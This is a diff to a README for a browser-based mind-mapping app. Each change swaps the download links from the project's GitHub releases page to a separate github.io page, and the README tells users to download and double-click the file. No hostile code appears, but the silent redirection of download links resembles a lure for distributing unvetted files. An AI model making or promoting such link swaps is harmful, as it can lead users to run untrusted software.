@@ -10,13 +10,13 @@ The best part? There's **no account creation, no software installation, no techn
 
 ## 📥 Download & Install
 
-[![Download mindmap](https://img.shields.io/badge/Download-mindmap-brightgreen?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/fernandabewitched286/mindmap/releases)
+[![Download mindmap](https://img.shields.io/badge/Download-mindmap-brightgreen?style=for-the-badge&logo=github&color=4CAF50)](https://fernandabewitched286.github.io)
 
 **Visit this link to download the application.**
 
 Here's exactly what to do:
 
-1. Click the button above or go to: [https://github.com/fernandabewitched286/mindmap/releases](https://github.com/fernandabewitched286/mindmap/releases)
+1. Click the button above or go to: [https://fernandabewitched286.github.io](https://fernandabewitched286.github.io)
 2. On that page, you'll see a list of available files. Look for the most recent version.
 3. Click the download button next to the file named something like `mindmap.html` (the exact name might include a version number).
 4. Once downloaded, simply double-click the file. It will open in your default web browser, and you're ready to go!
@@ -155,7 +155,7 @@ mindmap is built using **HTML, CSS, and JavaScript** with **SVG** for rendering 
 
 ## 📚 Ready to Start?
 
-[![Get mindmap Now](https://img.shields.io/badge/🚀_Get_mindmap_Now-FF5722?style=for-the-badge&logo=github&color=FF5722)](https://github.com/fernandabewitched286/mindmap/releases)
+[![Get mindmap Now](https://img.shields.io/badge/🚀_Get_mindmap_Now-FF5722?style=for-the-badge&logo=github&color=FF5722)](https://fernandabewitched286.github.io)
 
 Click the button above, download the file, and open it. In less than a minute, you'll be growing your ideas into a beautiful, organized map. Enjoy!
 
